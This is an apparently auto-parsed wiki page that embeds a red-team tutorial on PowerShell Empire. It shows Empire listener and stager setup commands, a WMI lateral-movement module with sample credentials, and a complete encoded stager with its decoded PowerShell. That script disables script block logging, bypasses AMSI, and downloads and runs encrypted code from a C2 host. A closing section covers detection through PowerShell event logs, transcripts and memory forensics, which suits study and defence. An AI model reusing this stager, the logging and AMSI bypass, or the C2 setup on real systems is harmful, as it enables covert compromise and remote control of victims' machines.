---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Powershell Empire 101

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-red-team-infrastructure-powershell-empire-101` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/red-team-infrastructure/powershell-empire-101.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Powershell Empire 101](../../topics/offensive-security/powershell-empire-101.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-red-team-infrastructure-powershell-empire-101 |
| name | Powershell Empire 101 |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/red-team-infrastructure/powershell-empire-101.md |

## Preserved Source Material

````yaml
_asset_filenames:
- agent-beacon-request-response.png
- agent-beaconing.png
- agent-beacons-logs.png
- agent-procmon.png
- empire-4103.png
- empire-800.png
- empire-lateral-wmi.gif
- empire-listener.png
- empire-stager (1).png
- empire-startlistener.png
- empire-transcript.png
- empire-volatility.png
- stager-bat.png
- stager-hta.gif
- stager-http.png
- stager-listeners.png
- stager-pcap.png
- stager-received.gif
- stager-vbs.png
_body: "---\ndescription: Exploring key concepts of the Powershell Empire\n---\n\n# Powershell Empire 101\n\n## Listener\n\
  \n{% code title=\"attacker@local\" %}\n```csharp\n// Empire commands used\n?\nuselistener meterpreter\ninfo\n```\n{% endcode\
  \ %}\n\n![](../../.gitbook/assets/empire-listener.png)\n\nStarting the listener:\n\n```\nexecute\n```\n\n![](../../.gitbook/assets/empire-startlistener.png)\n\
  \n## Stager\n\nStager will download and execute the final payload which will call back to the listener we set up previously\
  \ - `meterpreter`- below shows how to set it up:\n\n{% code title=\"attacker@local\" %}\n```csharp\n//specify what stager\
  \ to use\nusestager windows/hta\n\n//associate stager with the meterpreter listener\nset Listener meterpreter\n\n//write\
  \ stager to the file\nset OutFile stage.hta\n\n//create the stager\nexecute\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/empire-stager\
  \ (1).png>)\n\nA quick look at the stager code:\n\n![](../../.gitbook/assets/stager-hta.gif)\n\n### Issues\n\nVarious stagers\
  \ I generated for the meterpreter listener were giving me errors like [this](https://github.com/EmpireProject/Empire/issues/896)\
  \ and this:\n\n![](../../.gitbook/assets/stager-bat.png)\n\nand this:\n\n![](../../.gitbook/assets/stager-vbs.png)\n\nAfter\
  \ looking at the traffic and a quick nmap scan, it seemed like there may be a bug in Empire's uselistener module when used\
  \ with meterpreter - for some reason it will not actually start listening/open up the port:\n\n![](../../.gitbook/assets/stager-listeners.png)\n\
  \n![](../../.gitbook/assets/stager-pcap.png)\n\nTo test this assumption, I created another http listener on port 80 - which\
  \ worked immediately, leaving the meterpeter listener being buggy at least in my environment:\n\n![](../../.gitbook/assets/stager-http.png)\n\
  \n## Agent\n\nAgent is essentially a compromised victim system that called back to the listener and is now ready to receive\
  \ commands.\n\nContinuing testing with the `http` listener and a `multi/launcher` stager, the agent is finally returned\
  \ once the `launcher.ps1` (read: stager) is executed on the victim system:\n\n![](../../.gitbook/assets/stager-received.gif)\n\
  \nLet's try getting one more agent back from another machine via [WMI lateral movement](../lateral-movement/t1047-wmi-for-lateral-movement.md):\n\
  \n{% code title=\"attacker@local\" %}\n```csharp\ninteract <agent-name>\nusemodule powershell/lateral_movement/invoke_wmi\n\
  set Agent <agent-name>\nset UserName offense\\administrator\nset Password 123456\nset ComputerName dc-mantvydas\nrun\n```\n\
  {% endcode %}\n\n![](../../.gitbook/assets/empire-lateral-wmi.gif)\n\n## Beaconing\n\nWith default http listener profile\
  \ set, below are the most commonly used URLs of the agent beaconing back to the listener:\n\n![](../../.gitbook/assets/agent-beaconing.png)\n\
  \nThe packet data in any of those beacons:\n\n![](../../.gitbook/assets/agent-beacon-request-response.png)\n\n## Observations\n\
  \nNote how executing the stager launcher.ps1 spawned another powershell instance and both parent and the child windows are\
  \ hidden. Note that the children powershell was invoked with an encoded powershell command line:\n\n![](../../.gitbook/assets/agent-procmon.png)\n\
  \nStager's command line in base64:\n\n```csharp\n\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP\
  \ -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAFIAcwBpAE8AbgBUAGEAYgBMAGUALgBQAFMAVgBFAHIAUwBpAE8ATgAuAE0AQQBKAE8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBlAEYAXQAuAEEAcwBzAEUAbQBCAGwAeQAuAEcAZQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAGkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAGUAdABWAGEATAB1AGUAKAAkAE4AdQBsAEwAKQA7AEkARgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAEUAYwB0AEkATwBuAHMALgBHAGUATgBlAFIAaQBDAC4ARABJAGMAdABpAG8ATgBhAFIAeQBbAHMAVABSAEkAbgBHACwAUwB5AHMAdABFAG0ALgBPAGIAagBFAGMAdABdAF0AOgA6AG4ARQB3ACgAKQA7ACQAdgBhAGwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUATABTAEUAewBbAFMAYwByAEkAcAB0AEIATABPAEMAawBdAC4AIgBHAGUAVABGAGkARQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAFQAVgBhAEwAVQBlACgAJABuAFUATABMACwAKABOAGUAdwAtAE8AQgBqAEUAQwB0ACAAQwBvAEwAbABFAEMAVABJAG8AbgBTAC4ARwBFAE4AZQByAEkAQwAuAEgAYQBzAEgAUwBlAFQAWwBzAHQAcgBJAE4AZwBdACkAKQB9AFsAUgBFAEYAXQAuAEEAUwBTAEUATQBiAGwAWQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATABVAGUAKAAkAG4AVQBMAGwALAAkAHQAcgBVAGUAKQB9ADsAfQA7AFsAUwB5AFMAdABFAG0ALgBOAGUAdAAuAFMARQBSAFYAaQBjAGUAUABPAGkATgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBvAE4AdABJAE4AVQBlAD0AMAA7ACQAdwBjAD0ATgBFAFcALQBPAEIASgBlAEMAVAAgAFMAeQBTAFQAZQBNAC4ATgBlAHQALgBXAGUAYgBDAEwASQBFAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgAZQBBAGQAZQByAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAUgBPAFgAeQA9AFsAUwBZAFMAdABFAG0ALgBOAEUAdAAuAFcARQBiAFIARQBRAFUAZQBTAFQAXQA6ADoARABFAGYAQQB1AEwAVABXAEUAYgBQAFIAbwB4AHkAOwAkAFcAQwAuAFAAUgBvAFgAWQAuAEMAcgBFAEQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQAZQBNAC4ATgBFAFQALgBDAHIARQBkAEUATgBUAEkAQQBsAEMAYQBDAEgARQBdADoAOgBEAEUAZgBhAHUAbAB0AE4AZQBUAHcATwBSAGsAQwBSAGUAZABFAG4AVABpAGEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AHMAdABFAE0ALgBUAEUAeABUAC4ARQBuAEMATwBEAEkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQB0AGUAcwAoACcAUgAuACUAPwBWAHQAQwA4AHgAcQBnAG4AcwBGAGMANQBaACsAOgA5AHcAZABFAH0AQQBCAE0AcAB7AG0AegBPACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUATgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIALgA3ADEAOgA4ADAAJwA7ACQAdAA9ACcALwBsAG8AZwBpAG4ALwBwAHIAbwBjAGUAcwBzAC4AcABoAHAAJwA7ACQAVwBjAC4ASABFAEEAZABlAHIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AOQB1AGwAYQB0AEwASwBMAHgANQBEAFcAWgA1AEkAYQB3AFIAdQBzAEYAUwAyAFoAMgByAEEAPQAiACkAOwAkAGQAQQB0AGEAPQAkAFcAQwAuAEQAbwBXAE4AbABvAEEAZABEAGEAdABBACgAJABTAEUAUgArACQAdAApADsAJABJAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAEQAYQBUAEEAPQAkAEQAYQB0AEEAWwA0AC4ALgAkAEQAYQB0AEEALgBMAGUATgBnAFQASABdADsALQBqAE8AaQBOAFsAQwBoAGEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\n\
  ```\n\nDecoded command line with notable user agent, C2 server and a session cookie:\n\n```csharp\nIf($PSVeRsiOnTabLe.PSVErSiON.MAJOR\
  \ - ge 3) {\n    $GPF = [ReF].AssEmBly.GeTTyPE('System.Management.Automation.Utils').\n    \"GETFiE`ld\" ('cachedGroupPolicySettings',\
  \ 'N' + 'onPublic,Static');\n    If($GPF) {\n        $GPC = $GPF.GetVaLue($NulL);\n        IF($GPC['ScriptB' + 'lockLogging'])\
  \ {\n            $GPC['ScriptB' + 'lockLogging']['EnableScriptB' + 'lockLogging'] = 0;\n            $GPC['ScriptB' + 'lockLogging']['EnableScriptBlockInvocationLogging']\
  \ = 0\n        }\n        $vAL = [ColLEctIOns.GeNeRiC.DIctioNaRy[sTRInG, SystEm.ObjEct]]::nEw();\n        $val.ADd('EnableScriptB'\
  \ + 'lockLogging', 0);\n        $VaL.ADd('EnableScriptBlockInvocationLogging', 0);\n        $GPC['HKEY_LOCAL_MACHINE\\Software\\\
  Policies\\Microsoft\\Windows\\PowerShell\\ScriptB' + 'lockLogging'] = $Val\n    }\n    ELSE {\n        [ScrIptBLOCk].\n\
  \        \"GeTFiE`lD\" ('signatures', 'N' + 'onPublic,Static').SeTVaLUe($nULL, (New - OBjECt CoLlECTIonS.GENerIC.HasHSeT[strINg]))\n\
  \    }[REF].ASSEMblY.GETTYpe('System.Management.Automation.AmsiUtils') | ? {\n        $_\n    } | % {\n        $_.GETField('amsiInitFailed',\
  \ 'NonPublic,Static').SETVALUe($nULl, $trUe)\n    };\n};\n[SyStEm.Net.SERVicePOiNtMANAGEr]::EXpeCt100CoNtINUe = 0;\n$wc\
  \ = NEW - OBJeCT SySTeM.Net.WebCLIENT;\n$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';\n$wc.HeAderS.Add('User-Agent',\
  \ $u);\n$wc.PROXy = [SYStEm.NEt.WEbREQUeST]::DEfAuLTWEbPRoxy;\n$WC.PRoXY.CrEDenTiaLS = [SYsteM.NET.CrEdENTIAlCaCHE]::DEfaultNeTwORkCRedEnTiaLs;\n\
  $Script: Proxy = $wc.Proxy;\n$K = [SystEM.TExT.EnCODINg]::ASCII.GeTBytes('R.%?VtC8xqgnsFc5Z+:9wdE}ABMp{mzO');\n$R = {\n\
  \    $D,\n    $K = $ARGS;$S = 0. .255;0. .255 | % {\n        $J = ($J + $S[$_] + $K[$_ % $K.COUNt]) % 256;$S[$_],\n    \
  \    $S[$J] = $S[$J],\n        $S[$_]\n    };$D | % {\n        $I = ($I + 1) % 256;$H = ($H + $S[$I]) % 256;$S[$I],\n  \
  \      $S[$H] = $S[$H],\n        $S[$I];$_ - bxor$S[($S[$I] + $S[$H]) % 256]\n    }\n};\n$ser = 'http://192.168.2.71:80';\n\
  $t = '/login/process.php';\n$Wc.HEAderS.AdD(\"Cookie\", \"session=9ulatLKLx5DWZ5IawRusFS2Z2rA=\");\n$dAta = $WC.DoWNloAdDatA($SER\
  \ + $t);\n$Iv = $DATa[0. .3];\n$DaTA = $DatA[4..$DatA.LeNgTH]; - jOiN[ChaR[]]( & $R $datA($IV + $K)) | IEX\n```\n\n### Logs\n\
  \nIf we isolate the evil powershell that was infected by the Empire in our SIEM, we can see the beacons:\n\n![](../../.gitbook/assets/agent-beacons-logs.png)\n\
  \nA compromised system can generate event `800` showing the following in Windows PowerShell logs (powershell 5.0+):\n\n\
  ![](../../.gitbook/assets/empire-800.png)\n\nAlso loads of `4103` events in `Microsoft-Windows-PowerShell/Operational`:\n\
  \n![](../../.gitbook/assets/empire-4103.png)\n\nIn the same way, if PS transcript logging is enabled, the stager execution\
  \ could be captured in there:\n\n![](../../.gitbook/assets/empire-transcript.png)\n\n### Memory Dumps\n\nA memory dump can\
  \ also reveal the same stager activity:\n\n```csharp\nvolatility -f /mnt/memdumps/w7-empire.bin consoles --profile Win7SP1x64\n\
  ```\n\n![](../../.gitbook/assets/empire-volatility.png)\n\n## References\n\n{% embed url=\"http://www.harmj0y.net/blog/empire/expanding-your-empire/\"\
  \ %}\n\n{% embed url=\"http://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire/\" %}\n\n{% embed\
  \ url=\"https://null-byte.wonderhowto.com/how-to/use-powershell-empire-getting-started-with-post-exploitation-windows-hosts-0178664/\"\
  \ %}\n\n{% embed url=\"https://ethicalhackingblog.com/hacking-powershell-empire-2-0/\" %}\n\n{% embed url=\"http://www.sixdub.net/?p=627\"\
  \ %}\n\n[https://www.sans.org/reading-room/whitepapers/incident/disrupting-empire-identifying-powershell-empire-command-control-activity-38315](https://www.sans.org/reading-room/whitepapers/incident/disrupting-empire-identifying-powershell-empire-command-control-activity-38315)"
_relative_path: offensive-security/red-team-infrastructure/powershell-empire-101.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/red-team-infrastructure/powershell-empire-101.md
````
